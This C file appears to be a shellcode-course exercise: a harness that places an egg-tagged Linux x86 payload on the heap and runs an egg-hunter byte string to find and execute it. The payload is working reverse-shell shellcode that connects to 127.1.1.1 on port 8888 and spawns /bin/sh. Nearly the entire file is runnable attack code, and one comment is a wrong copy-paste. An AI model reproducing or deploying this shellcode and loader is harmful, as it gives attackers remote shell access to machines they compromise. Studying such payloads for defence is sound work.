// File: shellcode_memcheck.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// remember egg hunter assembly, mov edx, 0x464e464e
#define EGG "\x4e\x46\x4e\x46"

// this line inserts 1x EGG string to binary .data section
char egg[] = EGG;

// this line inserts 1x EGG string to binary .data section
unsigned char egghunter[] = \
"\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x4e\x46\x4e\x46\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";

unsigned char shellcode[] = \
"\x6a\x66\x58\x6a\x01\x5b\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x5b\x68\x7f\x01\x01\x01\x66\x68\x22\xb8\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x87\xde\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x41\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xf7\xe1\xb0\x0b\xcd\x80";

main()
{
    printf("Egghunter Length:  %d\n", sizeof(egghunter) - 1);

    char *heapMemory;
    heapMemory = malloc(300);

    // these 2 lines insert 2x EGG strings to binary [heap] section
    memcpy(heapMemory + 0, egg, 4);
    memcpy(heapMemory + 4, egg, 4);
    memcpy(heapMemory + 8, shellcode, sizeof(shellcode) + 1);

    printf("Memory location of shellcode: %p\n", heapMemory);

    int (*CodeFun)() = (int(*)())egghunter;
    CodeFun();

    free(heapMemory);
}
